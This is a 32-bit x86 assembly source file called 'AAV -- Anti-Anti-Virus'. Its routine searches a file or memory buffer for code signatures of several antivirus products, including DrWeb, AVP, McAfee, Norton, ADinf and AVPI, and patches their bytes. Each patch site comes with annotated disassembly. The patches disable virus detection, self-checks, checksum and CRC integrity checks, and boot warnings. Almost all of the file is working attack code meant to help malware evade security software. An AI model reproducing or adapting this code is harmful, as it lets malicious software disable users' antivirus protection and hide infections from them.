
;----------------------------------------------------------------------------
; AAV -- Anti-Anti-Virus -- (x) 2000-2001
;
;   antivirus:  crack subject:
;   ~~~~~~~~~   ~~~~~~~~~~~~~
;
; þ universal   MZ/PE/NE/LE/LX checking
; þ DRWEB       std-csum
; þ AVP         lancrypto-csum, std-csum, .avc csum checking
; þ MACAFE      virus-detection, self-check
; þ NAV         virus-detection
; þ ADINF       crc16/32/48
; þ AVPI        crc32, boot-warning
;   ...
;
;----------------------------------------------------------------------------

; subroutine: patch_buf
; action:     patch suckin antiviral code
; input:      buffer & size (the whole file, or memory block)
; output:     EAX=# of changed bytes
; comment:    all crks are made offset-independent
;             to support as much av-versions as possible

include                 AAVPATCH.INC
include                 ..\..\INCLUDE\consts.inc

                        public  patch_buf

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

                        dd      ?

                        .code

patch_buf:              pusha

                        mov     esi, [esp+4]+32         ; buf
                        mov     ecx, [esp+8]+32         ; size

                        xor     ebx, ebx        ; return value, # bytes

__cycle:                cmp     ecx, 32
                        jb      __exitcycle

                        mov     eax, [esi]

                        not     eax

                        cmp     dword ptr [esp+12]+32, 0
                        je      __skip_patch0

                        cmp     ax, not 05A4Dh ; MZ
                        je      __patch0
                        cmp     ax, not 04D5Ah ; ZM
                        je      __patch0
                        cmp     ax, not 04550h ; PE
                        je      __patch0
                        cmp     ax, not 0454Eh ; NE
                        je      __patch0
                        cmp     ax, not 0454Ch ; LE
                        je      __patch0
                        cmp     ax, not 0584Ch ; LX
                        je      __patch0
__skip_patch0:
                        cmp     eax, not 0E230D630h ; WEB
                        je      __patch1

                        cmp     eax, not 05B9C245Eh ; AVP
                        je      __patch2
                        cmp     eax, not 0C233D333h ;
                        je      __patch3
                        cmp     eax, not 0C83B08C4h ;
                        je      __patch4

                        cmp     eax, not 002C08789h ; MACAFE
                        je      __patch5
                        cmp     eax, not 001FC45C7h ;
                        je      __patch6

                        cmp     eax, not 75FF0CC4h  ; NAV
                        je      __patch7
                        cmp     eax, not 7502F883h  ;
                        je      __patch8
                        cmp     eax, not 7503F883h  ;
                        je      __patch8

                        cmp     eax, not 01E32D88Ah ; ADINF
                        je      __patch9

                        cmp     eax, not 08B08E8C1h ; AVPI
                        je      __patch10
                        cmp     eax, not 08B08E9C1h ;
                        je      __patch10
                        cmp     ax,  not 0BE1Fh      ;
                        je      __patch11
                        cmp     eax, not 016CDC033h  ;
                        je      __patch12

__continue:             inc     esi
                        dec     ecx
                        jmp     __cycle
__exitcycle:
                        mov     [esp].popa_eax, ebx

                        popa
                        retn

;----------------------------------------------------------------------------

; universal -- MZ/ZM/PE/NE/LE/LX-checking

; ... [nn nn]           cmp     ..., nnnn
; ... [nn nn] 00 00     cmp     ..., 0000nnnn
; 74|75 xx              jz|jnz  xxxxxxxx        ; jz  --> NOP/NOP/...
; 0F 84|85 xx xx xx xx  jz|jnz  xxxxxxxx        ; jnz --> NOP/jmp

__patch0:               lea     edx, [esi+2]
                        cmp     word ptr [edx], 0
                        jne     __l1
                        inc     edx
                        inc     edx
__l1:                   call    __x
                        jmp     __continue

__x:                    cmp     byte ptr [edx], 74h
                        je      __x1z
                        cmp     byte ptr [edx], 75h
                        je      __x1nz
                        cmp     word ptr [edx], 840Fh
                        je      __x2z
                        cmp     word ptr [edx], 850Fh
                        je      __x2nz
                        retn
__x1z:
__x2z:
__x1nz:
__x2nz:
                        add     word ptr [esi], sp
                        inc     ebx
                        inc     ebx
                        retn

; DRWEB -- std-csum

;[30 D6                 xor     dh, dl
; 30 E2]                xor     dl, ah
; 30 C4                 xor     ah, al
; .. ..
; 30 F0                 xor     al, dh  -->   00 F0   add al, dh

__patch1:               cmp     word ptr [esi+4], 0C430h
                        jne     __continue
                        mov     edx, 16
__a1:                   cmp     word ptr [esi+edx], 0F030h
                        je      __a2
                        dec     edx
                        jnz     __a1
                        jmp     __continue
__a2:
                        mov     byte ptr [esi+edx], 00h
                        inc     ebx
                        jmp     __continue

;----------------------------------------------------------------------------

; AVP -- lancrypto-csum

; 7507                  jne     xxxxxxxx
; 40                    inc     eax
; 663D0900              cmp     ax, 9
; 72E6                  jb      xxxxxxxx
; 662D0900              sub     ax, 9
; 5F                    pop     edi
; 66F7D8                neg     ax
; 1BC0                  sbb     eax, eax      --> 33 C0 == xor eax, eax
;[5E                    pop     esi
; 249C                  and     al, 9C
; 5B]                   pop     ebx
; C9                    leave
; C3                    retn

__patch2:               cmp     dword ptr [esi-4], 0C01BD8F7h
                        jne     __continue
                        mov     byte ptr [esi-2], 33h
                        inc     ebx
                        jmp     __continue

; AVP -- std-csum

; 8BD0                  mov     edx, eax
; 33DB                  xor     ebx, ebx
; 8A19                  mov     bl, [ecx]
; C1E208                shl     edx, 8
;[33D3                  xor     edx, ebx
; 33C2]                 xor     eax, edx      --> 33 C0  xor eax, eax

; 8D1400                lea     edx, [eax][eax]
; 8A19                  mov     bl, [ecx]
;[33D3                  xor     edx, ebx
; 33C2]                 xor     eax, edx      --> 33 C0  xor eax, eax

__patch3:               cmp     dword ptr [esi-4], 08E2C119h
                        je      __c1
                        cmp     dword ptr [esi-4], 198A0014h
                        jne     __continue
__c1:
                        mov     byte ptr [esi+3], 0C0h
                        inc     ebx
                        jmp     __continue

; AVP -- .avc csum checking
; 50                    push    eax
; 57                    push    edi
; E8xxxxxxxx            call    xxxxxxxx   ; calc_csum, which is now patched
; 8B4E18                mov     ecx, [esi+18]
; 83[C408               add     esp, 8
; 3BC8]                 cmp     ecx, eax      --> 3B C9 == cmp ecx, ecx

__patch4:               cmp     dword ptr [esi-4], 83184E8Bh
                        jne     __continue
                        cmp     byte ptr [esi-9], 0E8h
                        jne     __continue
                        mov     byte ptr [esi+3], 0C9h
                        inc     ebx
                        jmp     __continue

;----------------------------------------------------------------------------

; MACAFE -- disable virus-detection

; mcscan32.dll
; B801000000            mov     eax, 1           --> B8 00 ...   mov eax, 0
; EB02                  jmp     xxxxxxxx
; 31C0                  xor     eax, eax
; [8987C002]0000        mov     [edi+0000002C0], eax

__patch5:               cmp     dword ptr [esi-4], 0C03102EBh
                        jne     __continue
                        cmp     dword ptr [esi-8], 1
                        jne     __continue
                        mov     byte ptr [esi-8], 0
                        inc     ebx
                        jmp     __continue

; MACAFE -- disable self-check

; mcutil32.dll
; 83 C4 10              add     esp, 10h
; 3B 45 F3              cmp     eax, [ebp+csum]
; 74 07                 je      xxxxxxxx
;[C7 45 FC 01]00 00 00  mov     [ebp+res], 1

__patch6:               cmp     dword ptr [esi-4], 0774F345h
                        jne     __continue
                        cmp     dword ptr [esi-8], 3B10C483h
                        jne     __continue
                        cmp     dword ptr [esi+3], 1
                        jne     __continue
                        mov     byte ptr  [esi+3], 0
                        inc     ebx
                        jmp     __continue

;----------------------------------------------------------------------------

; NAV -- virus-detection

; FF 75 xx              push    [ebp+xx]
; 8D 45 nn              lea     eax, [ebp+virus_id]
; 50                    push    eax
; FF 75 xx              push    [ebp+xx]
; E8 xx xx xx xx        call    xxxxxxxx ; copy_virus_name
; 83[C4 0C              add     esp, 0Ch
; FF 75]xx              push    [ebp+xx]
; E8 xx xx xx xx        call    xxxxxxxx ; _VLReleaseVirusHandle@4
; 8B 45 nn              mov     eax, [ebp+virus_id]   ; <-- 33 C0 / 90
; EB xx                 jmp     xxxxxxxx              ; (xor eax, eax / nop)

__patch7:               mov     eax, [esi-16-2]
                        xor     eax, [esi-13-2]
                        mov     ax, [esi-9]
                        xor     ax, [esi+10]
                        cmp     eax, 75FF75FFh xor 458D458Bh
                        jne     __continue
                        mov     al, [esi-10]
                        add     al, [esi-6]
                        add     al, [esi+5]
                        add     al, [esi+13]
                        cmp     al, (50h+0E8h+0E8h+0EBh) and 0FFh
                        jne     __continue
                        mov     dword ptr [esi+10], 0EB90C033h
                        add     ebx, 3
                        jmp     __continue

; NAV -- virus-detection(#2,redundant)

;[83 F8 02||03          cmp     eax, xx   ; 2||3
; 75]xx                 jnz     xxxxxxxx         ; --> EB (jmp)
; 8D 45 xx              lea     eax, [ebp+xx]
; 50                    push    eax
; FF 75 xx              push    [ebp+xx]
; 56||57                push    esi||edi
; E8 xx xx xx xx        call    xxxxxxxx  ; _VLDetermineVirusIndex@12
; 66 85 C0              test    ax, ax
; 74||75 xx             jz||jnz xxxxxxxx

__patch8:
                        mov     eax, [esi+5-2]
                        mov     ax, [esi+9]
                        cmp     eax, 458D75FFh
                        jne     __continue
                        mov     eax, [esi+18-1]
                        mov     al, [esi+8]
                        xor     al, [esi+13]
                        cmp     eax, 0C0856650h xor 0E8h
                        jne     __continue
                        mov     al, [esi+12]
                        xor     al, [esi+21]
                        and     al, 0FEh
                        cmp     al, 56h xor 74h
                        jne     __continue
                        mov     byte ptr [esi+3], 0EBh
                        inc     ebx
                        jmp     __continue

;----------------------------------------------------------------------------

; ADINF -- crc16/crc32

; dsavcrc.dll
; crc16
; 33 DB                 xor     ebx, ebx
;[8A D8                 mov     bl, al
; 32 1E]                xor     bl, [esi]       --> 32 DB  xor bl, bl
; 46                    inc     esi
; D1 E3                 shl     ebx, 1
; 8A C4                 mov     al, ah
; 32 E4                 xor     ah, ah
; 66 33 04 1F           xor     ax, [edi+ebx]
; crc32
; 33 DB                 xor     ebx, ebx
;[8A D8                 mov     bl, al
; 32 1E]                xor     bl, [esi]       --> 32 DB  xor bl, bl
; 46                    inc     esi
; C1 E3 02              shl     ebx, 2
; C1 E8 08              shr     eax, 8
; 33 04 1F              xor     eax, [edi+ebx]
; E2 EE                 loop    xxxxxxxx

__patch9:               mov     eax, [esi+4]
                        xor     eax, [esi+8]
                        cmp     eax, 8AE3D146h xor 66E432C4h
                        je      __d1
                        cmp     eax, 02E3C146h xor 3308E8C1h
                        jne     __continue
__d1:
                        mov     byte ptr [esi+3], 0DBh
                        inc     ebx
                        jmp     __continue

;----------------------------------------------------------------------------

; AVPI -- crc32

;[C1 E8 08              shr     eax, 8
; 8B]14 95 xx xx xx xx  mov     edx, crc32tab[edx*4]
; 33 C2                 xor     eax, edx             ; --> 33 c0  xor eax,eax

;[C1 E9 08              shr     ecx, 8
; 8B]04 85 xx xx xx xx  mov     eax, crc32tab[eax*4]
; 33 C1                 xor     eax, ecx             ; --> 33 c0  xor eax,eax

__patch10:              mov     eax, [esi+4-2]
                        mov     ax, [esi+10]
                        cmp     eax, 9514C233h
                        je      __e1
                        cmp     eax, 8504C133h
                        jne     __continue
__e1:
                        mov     byte ptr [esi+11], 0C0h
                        inc     ebx
                        jmp     __continue

; AVPI -- boot warning

; avpiboot.vxd (16-bit)
; 0E                    push    cs
;[1F                    pop     ds
; BE]xx xx              mov     si, offset aErrorReadingBootShit
; E8 xx xx              call    doDialogBox   ; --> B8   mov eax, ...
; F9                    stc
; EB xx                 jmp     xxxxxxxx

__patch11:              mov     eax, [esi+7-2]
                        mov     al, [esi-1]
                        mov     ah, [esi+4]
                        cmp     eax, 0EBF9E80Eh
                        jne     __continue
                        mov     byte ptr [esi+4], 0B8h
                        inc     ebx
                        jmp     __continue

; avpiboot.vxd (16-bit)
; 33 C0                 xor     ax, ax
; CD 16                 int     16h     ; --> B0 6E  mov al, 'n'

__patch12:
                        mov     word ptr [esi+2], 6EB0h
                        inc     ebx
                        inc     ebx
                        jmp     __continue

;----------------------------------------------------------------------------

                        end
